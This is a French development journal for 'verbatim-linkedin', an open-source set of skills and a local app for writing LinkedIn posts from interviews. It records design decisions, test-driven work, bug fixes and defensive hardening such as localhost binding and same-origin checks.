Alexis a tranché : sobre, ni beige, ni marron, ni bordeaux, ni orange. La CSS
de l'étape 4 ouvrait sur « warm paper, warm ink » et posait exactement ça.
Conséquence non triviale : **l'orange était réservé au panneau de traçabilité
par le plan**. Il est remplacé par un surligneur jaune acide, invariant par
thème, et le panneau gagne un troisième état que le plan ne nommait pas, la
citation fabriquée. Palettes clair et sombre vérifiées au contraste, serif
réservé aux mots de la personne. La passe se fait avec la tranche 5.5, quand
l'écran qui la justifie existe. Détail dans l'amendement du plan.

## 2026-08-28. Gate levé par Alexis, étape 4 livrée : le socle applicatif

Commit `7722fc1`, local au moment de la session, non poussé. Le prompt de la
session suivante (étape 5, à découper en tranches) a été remis à Alexis. Un
conflit de port a clos la session : la démo sur le persona occupait 8747,
arrêtée pour laisser la place à l'app sur l'instance réelle.

Alexis a levé explicitement le gate des 5 posts publiés pour la partie
applicative (« continue la construction de l'app, sans avoir tous les posts
écrits/publiés »). L'étape 3 (`linkedin-measure`) reste gatée sur des relevés
réels : coder le magasin de mesure contre des données inventées n'a pas changé
de statut. Le risque nommé au plan reste vrai et est maintenant porté par une
décision, pas par un oubli : construire l'outil au lieu de publier.

Livré, l'étape 4 en entier, en TDD :

**`app/verbatim_app/instance.py`.** La couche disque-est-la-base : lecture et
écriture des fichiers du contrat `references/instance.md`. Conformité dans
l'ordre du contrat, compteur de piliers recalculé à la lecture sur
`state: published` seulement, mise à jour de mesure textuelle qui préserve le
reste du front matter et le corps octet pour octet, écritures atomiques et
limitées aux fichiers du contrat. Stdlib seule, PyYAML optionnel avec repli
maison testé contre PyYAML, même philosophie que `lint.py`.

**Les écrans froids.** FastAPI + Jinja2, zéro build front, zéro connexion LLM :
Vue d'ensemble (Status, prochaine session, compteur), Profil (le fichier en
textarea, verbatim), Idées (la banque parsée, badges pilier et tunnel), Posts
(liste, détail, formulaire de mesure J+7), Corpus (lecture seule). Bind
127.0.0.1 en dur dans `cli.py`, garde same-origin qui refuse tout POST
cross-origin. Les chaînes d'interface vivent dans `locales/<lang>/app.yml`
(en, fr, gabarit `_template`), dégradation annoncée quand un pack est
incomplet, aucun texte utilisateur dans les templates.

**Le paquet.** `app/pyproject.toml`, nom `verbatim-linkedin`, commande
`verbatim` (sert une instance : `uv run --project app verbatim <instance>`),
version `2.0.0.dev0`. `check.sh` étendu : tests d'instance dans le bloc
python3, tests web via `uv` (skip annoncé sans uv), fichiers de l'app dans la
vérification de tracking, et le grep du plan qui refuse toute chaîne
d'instruction LLM sous `app/verbatim_app/`.

42 tests app (23 instance + 19 web), `check.sh` entièrement vert, écrans
vérifiés en vrai navigateur sur le persona Nadia Feriel. Design : papier
chaud, serif + mono données, un accent outremer, radius zéro, aucune ombre ;
l'orange reste réservé au panneau de traçabilité de l'étape 5.

La revue à contexte frais d'avant commit a refusé la première version pour un
vrai bug : un backslash dans la note de mesure écrivait un scalaire YAML
invalide et mettait tous les écrans en 500, fichier à réparer à la main.
Corrigé avec test de régression, plus trois durcissements sortis de la même
revue : compteurs négatifs refusés, garde Host contre le DNS rebinding (la
garde Origin ne couvre pas les GET), et une tournure du pack fr.

Prochain morceau : l'étape 5, le routeur moteur (`agent.py`, la boucle
multi-fournisseurs), le gros du chantier.

## 2026-08-27 (nuit). V2 grillée, contrat d'instance, troisième skill

Le plan V2 (l'application locale) a été grillé et acté côté instance de
référence, détail dans
[`../../linkedin/plans/2026-08-27-v2-application-locale.md`](../../linkedin/plans/2026-08-27-v2-application-locale.md).
Ce qui touche ce dépôt : tout MIT, multi-fournisseurs (Anthropic natif + tout
endpoint compatible OpenAI, donc l'inférence locale incluse), une seule boucle
d'agent maison au lieu du Claude Agent SDK, monorepo (`app/` viendra ici), nom
de paquet PyPI `verbatim-linkedin` (`verbatim` est pris), et un gate : rien
d'applicatif avant 5 posts publiés via le flux complet.

Exécuté ce soir, les deux étapes non gatées :

**`references/instance.md`.** Le contrat de l'instance, écrit pour ses deux
consommateurs, les skills d'aujourd'hui et l'app de demain. La règle centrale :
un besoin d'état nouveau étend le contrat, jamais une base à côté. La checklist
de conformité en fin de fichier est celle qui aurait attrapé le bloc signature
perdu à la migration.

**`skills/linkedin-profile`.** Troisième skill, les neuf sections de la page
LinkedIn publique. L'audit fait tourner la promesse à l'envers : chaque
affirmation déjà sur la page doit tracer vers `profile.md`, et ce qui ne trace
vers rien est cité et proposé à la suppression. Série C de trois intentions
dans `interview-intents.md`, formulations ajoutées aux packs en et fr. Le
résultat adopté s'archive dans `linkedin-page.md` à la racine de l'instance,
nom ajouté au `.gitignore` et à la règle de fuite de `check.sh`. Routeur passé
en 0.2.0.

Il manque encore `linkedin-measure` pour boucler les quatre skills du plan
d'origine, gaté sur des relevés réels. La release v1.1.0 attend ça.

## 2026-08-27 (nuit). Premier vrai passage, trois bugs

Le bundle a écrit un post de bout en bout sur le profil de son mainteneur,
entretien compris. Compte rendu côté contenu dans
[`../../linkedin/docs/journal.md`](../../linkedin/docs/journal.md). Ici, ce que
le passage a cassé.

### 1. Le `.gitignore` mangeait `references/measure.md`

Les règles de profil ignorent `measure.md` partout dans l'arbre, et
`references/measure.md` correspondait. **Le fichier n'est jamais parti dans la
première release.** Tous les liens vers lui, depuis le README et depuis
`linkedin-post`, étaient morts sur GitHub.

Corrigé en exemptant `references/` en entier : c'est un dossier du moteur par
définition, rien de ce qu'il contient n'a à être ignoré.

### 2. `check.sh` prouvait une absence, jamais une présence

C'est le vrai bug, le premier n'en est que le symptôme. Toutes les vérifications
existantes démontraient que quelque chose de personnel **n'était pas** dans
l'arbre. Aucune ne démontrait que le moteur **y était**. Un fichier avalé par le
`.gitignore` passait donc au vert.

Nouvelle étape : tout fichier de `references/`, `skills/`, `locales/` et `lib/`
doit être suivi par git, sinon `check.sh` échoue.

### 3. Le schéma de mesure n'avait pas d'état

Un fichier de post existe dès le brouillon. Sans champ d'état, un dossier de
brouillons et un dossier de posts publiés sont indiscernables, et tout comptage
de piliers ment. Ajout de `state` et de `published_ref` dans
`references/measure.md`, et la règle qui va avec : tout compte se fait sur
`state: published` uniquement.

Trouvé en enregistrant un post créé en DRAFT dans Postiz, dont le fichier n'avait
aucun moyen de dire qu'il n'était pas publié.

### Un quatrième, côté instance

Le bloc signature n'était pas dans `profile.md`. L'ancien skill le codait en
dur et la migration ne l'a pas vu. C'est un manque d'instance, pas de moteur :
`references/profile.template.md` portait bien la section. Le gabarit était juste,
la migration incomplète.

### Ce qui a tenu

**La règle qui interdit d'avancer sur une réponse abstraite.** Trois relances
avant d'obtenir une scène. C'est elle qui sépare l'entretien d'un formulaire, et
elle a été inconfortable exactement comme prévu.

**La sortie sur les deux angles.** Les deux propositions étaient correctes et
adossées à des citations réelles, et l'auteur a répondu à côté avec sa propre
thèse, qui était meilleure. « Aucun des deux ne te parle ? » n'est pas une
politesse, c'est ce qui a produit l'angle retenu.

**Le plan de publication avant envoi.** Le nom du canal imprimé en clair,
« Alexis Morain », à côté de son id. C'est ce qui rend le piège de la page
entreprise visible au lieu d'être une chaîne de caractères parmi d'autres.

**Le lint.** Clean sur le premier jet, ce qui n'est pas une victoire du linter
mais de `locales/fr/style.md` lu avant d'écrire. À noter quand même : la règle
d'espace insécable n'a pas été exercée, le corps ne contient aucune ponctuation
double. Elle reste non testée en réel.

### État à la clôture

Dépôt public `github.com/alexis-morain/verbatim-linkedin`, branche `main`,
41 fichiers suivis, arbre propre, `check.sh` à zéro.

| Commit | Contenu |
|---|---|
| `13ef82e` | Verbatim v0.1.0, moteur, packs `en` et `fr`, deux skills |
| `bc5b26d` | `references/measure.md` livré, plus les champs `state` et `published_ref` |
| `f021fa4` | La règle de fuite de profil ne flaggue plus le `measure.md` du moteur |
| `07ceb35` | Ce compte rendu |

Installé en local par `~/.claude/skills/verbatim`, symlink unique vers la racine
du dépôt, qui atterrit dans `00_Skills/verbatim` puisque le dossier de skills
est lui-même un lien. `post-linkedin` reste sur disque, `description` réécrite
pour qu'il ne se déclenche plus.

Pack `en` : `native_reviewed: false`, non relu par un anglophone. Chaque passe
de lint l'annonce à l'utilisateur.

## 2026-08-27 (nuit). Montage du dépôt et extraction du moteur

Exécution des étapes 1 à 4 de
[`../../linkedin/plans/2026-08-27-bundle-open-source.md`](../../linkedin/plans/2026-08-27-bundle-open-source.md).
Rien n'est commité à la fin de la session, le premier commit attend une
relecture des deux `SKILL.md`.

### Ce qui a été monté

Squelette, MIT, `.gitignore`, `git init` sur `main`. Le `.gitignore` ignore les
noms de fichiers de profil partout dans l'arbre, en français comme en anglais,
et réautorise `examples/`. Vérifié à la main avec `git check-ignore` : un
`profile.md` ou un `corpus/` à la racine est bien exclu, ceux d'`examples/`
passent, y compris `examples/corpus/`.

Six références écrites : `style-taxonomy.md` (les 10 catégories, neutres),
`interview-intents.md` (les 16 intentions, sans formulation, plus les trois
affordances de saisie), `formats.md` (5 formats, 3 étiquettes d'objectif, la
mécanique de l'angle avec sa citation), `platform.md`, `measure.md`,
`profile.template.md`.

Deux skills sur les quatre visés : `linkedin-post`, qui est l'extraction du
`SKILL.md` actuel débarrassé des sept blocs personnels, et `linkedin-setup`,
qui est le vrai produit pour un inconnu.

Deux packs de langue complets, quatre fichiers chacun, plus le `_template` qui
porte le contrat et les critères d'acceptation.

### Trois décisions prises en cours de route

**Le magasin de mesure, c'est les posts eux-mêmes.** La question 2 du plan était
ouverte. Choix : un bloc de front matter par fichier de post, source de vérité,
et toute vue agrégée se recalcule à la lecture. La raison est la dérive : un
second fichier n'est jamais à jour, et le jour où l'agrégat contredit les posts
c'est l'agrégat qui gagne parce qu'il est plus facile à lire. Le coût, relire
cent fichiers pour une tendance, est nul à cette échelle. Noté comme réversible
dans `references/measure.md`.

**Les noms de fichiers du profil sont en anglais**, `profile.md` et pas
`profil.md`, y compris pour un profil français. La décision 3 du plan porte sur
les noms de fichiers du moteur ; l'étendre au profil évite une table de
correspondance langue vers nom de fichier et garde un seul chemin de code. Le
contenu, lui, est dans la langue de la personne. Conséquence : la migration de
`../linkedin/` renomme quatre fichiers.

**`CLAUDE.md` est ignoré par git, `CONTRIBUTING.md` le remplace côté public.**
La convention du workspace veut un `CLAUDE.md` d'état projet en français ; un
dépôt public veut des conventions de contribution en anglais. Les deux existent,
ils ne disent pas la même chose.

### Ce qui a été codé, en TDD

`lib/lint.py`, passe de style déterministe, aucun modèle. 34 tests. Il lit
`locales/<lang>/lint.yml`, fait correspondre les termes sur limites de mots et
sans accents, applique les motifs, et vérifie la typographie. Seules les règles
marquées dures bloquent, et le pack décide lesquelles : `em_dash` et `emoji`
dans les deux packs livrés.

Repli de parseur : PyYAML s'il est là, sinon un lecteur maison qui ne couvre que
le sous-ensemble autorisé et **refuse** ce qu'il ne sait pas lire plutôt que de
deviner. Un test compare les deux parseurs sur les trois packs livrés et exige
l'égalité stricte.

`lib/publish.py`, dispatch des trois paliers, 16 tests. Tout ce qui quitte la
machine exige `--confirm`, et sans lui le script imprime la cible et s'arrête.
Le palier Postiz produit le payload et laisse l'appel réseau à l'agent, pour que
la liste des canaux puisse être vérifiée contre l'id d'abord. C'est le
garde-fou du piège de juillet.

`check.sh`, le bloc de validation avant push : tests, self-test des packs, fuite
de profil, `.env` traqué, front matter des skills avec sa sentinelle « Not
for », tiret cadratin et emoji dans tout le dépôt. Tout passe.

### Ce que le linter a trouvé sur le vrai post publié

Passé sur `../linkedin/corpus/2026-07-29-lgm-workflow.md` : un tiret cadratin
bloquant, huit espaces ordinaires avant deux-points, deux avant un point
d'interrogation, et un faux positif sur « rien de plus », corrigé en déplaçant
« de plus » des termes vers un motif ancré en tête de phrase. Le tiret cadratin
et les espaces étaient dans l'en-tête d'archive, pas dans le post : d'où la
règle d'écrire dans le skill de linter le corps seul, via stdin.

### Le nom, et le périmètre V1

Deux questions laissées ouvertes par le plan, tranchées ici.

**Verbatim**, dépôt `verbatim-linkedin`. `linkedin-skills` est pris par le dépôt
dont on part. Le nom devait porter le différenciateur et rester trouvable :
« verbatim » est exactement le mécanisme, aucun angle n'existe sans citation mot
pour mot, et le suffixe fait le travail de découverte sur GitHub. Le skill
routeur s'appelle `verbatim` et non `linkedin`, pour ne pas préempter un nom
générique dans `~/.claude/skills/`.

**Deux skills en V1, pas quatre.** `linkedin-measure` et `linkedin-profile`
attendent. La raison n'est pas le temps : setup plus post forme une boucle
complète et se teste, alors que la mesure n'a rien à lire tant qu'il n'y a pas
cinq à dix posts avec leurs chiffres à J+7. Écrire le skill de mesure
maintenant, ce serait spécifier contre un magasin vide.

### La décision 5 du plan, amendée

Le plan disait « symlink par skill ». Ça ne tient pas avec un routeur : depuis
`~/.claude/skills/linkedin-post/`, ni `references/` ni `locales/` ni `lib/` ne
résolvent. Le bundle s'installe donc **d'un bloc**, un seul symlink vers la
racine, et le routeur dispatche. Le coût est réel et assumé : pas de slash
command séparée par skill. L'alternative aurait été une variable
`VERBATIM_HOME` dans chaque skill, c'est-à-dire de la configuration pour
racheter une commodité.

### Ce qui reste

Le pack `en` n'a pas de lecteur natif. Et le vrai test n'est pas passé : écrire
un post avec le bundle, ce qui demande un entretien avec Alexis.
